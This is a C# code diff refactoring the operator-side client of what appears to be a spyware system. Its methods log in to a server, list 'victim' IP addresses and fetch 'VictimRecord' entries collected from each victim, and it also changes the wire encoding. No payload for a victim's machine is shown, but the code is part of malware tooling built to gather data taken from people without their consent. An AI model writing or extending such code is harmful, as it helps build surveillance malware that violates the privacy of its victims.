@@ -18,7 +18,7 @@ namespace ClientInterface
 
         public bool IsConnected => _client?.Connected ?? false;
 
-        public async Task<bool> ConnectAsync()
+        private async Task<bool> ConnectAsync()
         {
             try
             {
@@ -34,8 +34,11 @@ namespace ClientInterface
             }
         }
 
-        public async Task<SpyResponse<object>?> LoginAsync(string username, string password)
+        public async Task<bool> LoginAsync(string username, string password)
         {
+            if (!await ConnectAsync())
+                return false;
+
             var message = _director.GetLogginMessage(username, password);
             string json = message.ToString();
 
@@ -44,16 +47,14 @@ namespace ClientInterface
 
             var result = SpySerializer.DeserializeResponse<object>(response);
 
-            if (result == null || result.Code != ResponseCode.Success)
-            {
-                Console.WriteLine($"[Client] Login failed. Code: {(int?)result?.Code}, Content: {result?.Content}");
-                return null;
-            }
+            if (result != null && result.Code == ResponseCode.Success)
+                return true;
 
-            return result;
+            Console.WriteLine($"[Client] Login failed. Code: {(int?)result?.Code}, Content: {result?.Content}");
+            return false;
         }
 
-        public async Task<SpyResponse<IEnumerable<string>>?> GetVictimIpListAsync()
+        public async Task<IEnumerable<string>?> GetVictimIpListAsync()
         {
             var message = _director.GetVictimsIpListMessage();
             string json = message.ToString();
@@ -63,16 +64,14 @@ namespace ClientInterface
 
             var result = SpySerializer.DeserializeResponse<IEnumerable<string>>(response);
 
-            if (result == null || result.Code != ResponseCode.Success)
-            {
-                Console.WriteLine($"[Client] Failed to get victim IP list. Code: {(int?)result?.Code}, Content: {result?.Content}");
-                return null;
-            }
+            if (result != null && result.Code == ResponseCode.Success)
+                return result.Content;
 
-            return result;
+            Console.WriteLine($"[Client] Failed to get victim IP list. Code: {(int?)result?.Code}, Content: {result?.Content}");
+            return null;
         }
 
-        public async Task<SpyResponse<IEnumerable<VictimRecord>>?> GetVictimRecordsAsync(string victimIp)
+        public async Task<IEnumerable<VictimRecord>?> GetVictimRecordsAsync(string victimIp)
         {
             var message = _director.GetVictimRecordsMessage(victimIp);
             string json = message.ToString();
@@ -82,20 +81,16 @@ namespace ClientInterface
 
             var result = SpySerializer.DeserializeResponse<IEnumerable<VictimRecord>>(response);
 
-            if (result == null || result.Code != ResponseCode.Success)
-            {
-                Console.WriteLine($"[Client] Failed to get records for {victimIp}. Code: {(int?)result?.Code}, Content: {result?.Content}");
-                return null;
-            }
+            if (result != null && result.Code == ResponseCode.Success)
+                return result.Content;
 
-            return result;
+            Console.WriteLine($"[Client] Failed to get records for {victimIp}. Code: {(int?)result?.Code}, Content: {result?.Content}");
+            return null;
         }
-
-
 
         private async Task SendAsync(string data)
         {
-            byte[] buffer = Encoding.UTF8.GetBytes(data);
+            byte[] buffer = Encoding.Unicode.GetBytes(data);
             await _stream.WriteAsync(buffer, 0, buffer.Length);
         }
 
@@ -103,7 +98,7 @@ namespace ClientInterface
         {
             byte[] buffer = new byte[4096];
             int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
-            return Encoding.UTF8.GetString(buffer, 0, bytesRead);
+            return Encoding.Unicode.GetString(buffer, 0, bytesRead);
         }
 
         public void Disconnect()
